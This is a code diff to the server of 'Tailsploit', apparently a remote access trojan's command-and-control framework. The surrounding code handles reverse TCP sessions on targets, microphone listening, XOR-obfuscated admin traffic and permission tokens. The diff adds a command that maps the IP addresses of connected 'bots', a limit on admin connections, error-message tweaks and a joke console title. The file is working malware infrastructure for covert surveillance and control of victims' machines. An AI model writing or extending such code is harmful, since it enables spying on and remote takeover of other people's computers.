@@ -10,6 +10,8 @@ import json
 import requests
 import psutil
 import datetime
+import ctypes
+import folium
 import select
 
 # Get the absolute path of the directory containing the script
@@ -36,6 +38,7 @@ from lib.tsfwebhook.tsf_webhook import (
 )
 
 TailsploitCommandHandling = {}
+
 PERMISSION_HIERARCHY = {
     "user": 1,
     "admin": 2,
@@ -95,7 +98,7 @@ class ServerShell:
         self.TailsploitCommandHandler = {}
         self.UserPermission = ""
         self.clients_lock = threading.Lock()
-
+        self.MAX_ADMINS_CONN = 5
 
     def handleXOREncryption(self, content_data, key_traffic):
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
@@ -209,6 +212,13 @@ class ServerShell:
             HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(HandleExceptXOR)
 
+    @StaticMethodCommandHandler("map", is_available=True, exact_match=True, min_rank=1)
+    def TailsploitMapLayers(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        print("[*] Generating tailsploit data map layers...")
+        ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.clients.keys()]}"
+        ConnListDataXOR = self.handleXOREncryption(ConnListData.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+        admin_socket.send(ConnListDataXOR)
+        print("[*] Done, data has been save in ../../tmp/tailsploit-bot-ipmap-layer-html")
 
     @StaticMethodCommandHandler("stoplisten", is_available=True, exact_match=False, min_rank=2)
     def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
@@ -251,11 +261,11 @@ class ServerShell:
                     ErrorClosingSessionXOR = self.handleXOREncryption(ErrorClosingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                     admin_socket.send(ErrorClosingSessionXOR)
             else:
-                WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to kill it."
+                WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to kill the session."
                 WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(WarningSessionXOR)
         except:
-            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a \x1B[4mReverse TCP Session\x1B[0m in order to kill it."
+            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a \x1B[4mReverse TCP Session\x1B[0m in order to kill the session."
             WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(WarningSessionXOR)
 
@@ -446,7 +456,7 @@ class ServerShell:
     def OnGenerateTokenAuth(self, admin_socket, *args):
         TailsploitLocalPermissionHiearchy = ['user', 'admin', 'root']
         if len(args) != 3:
-            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'generate-token --permission root/admin/user'."
+            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'generate-token --permission user/admin/root'."
             InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(InvalidFormatXOR)
             return
@@ -480,7 +490,8 @@ For more information, see the JSON file located at:
 """
             SendTokenToAdmin = self.handleXOREncryption(CreatedFormatToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(SendTokenToAdmin)
-        except:
+        except Exception as e:
+            print(e)
             print("[*] An error occured while generating the token.")
 
     @StaticMethodCommandHandler("adminlist", is_available=True, exact_match=True, min_rank=1)
@@ -554,6 +565,10 @@ For more information, see the JSON file located at:
 
             OnAuthTokenResult = self.is_mac_whitelisted(AUTHENTICATION_KEY)
             print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} An Administrator Attempt To Connect ({Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
+            if len(self.admins) >= self.MAX_ADMINS_CONN:
+                print("Max Admin Reached")
+                client_socket.close()
+                return
             if self.TAILSPLOIT_LOG_WEBOOK:
                 TailsploitIncomingConnectionAdminClient(client_addr)
             if OnAuthTokenResult == "--FLAG_TOKEN_ALREADY_IN_USE":
@@ -806,6 +821,7 @@ For more information, see the JSON file located at:
         elapsed_time_ms = (end_time - start_time) * 1000
         os.system("cls")
         print("")
+        ctypes.windll.kernel32.SetConsoleTitleW("HAHAHAA")
         print("")
         print(f"""                        
                .*+      Tailsploit Framework Server (Enjoy Pentest !)
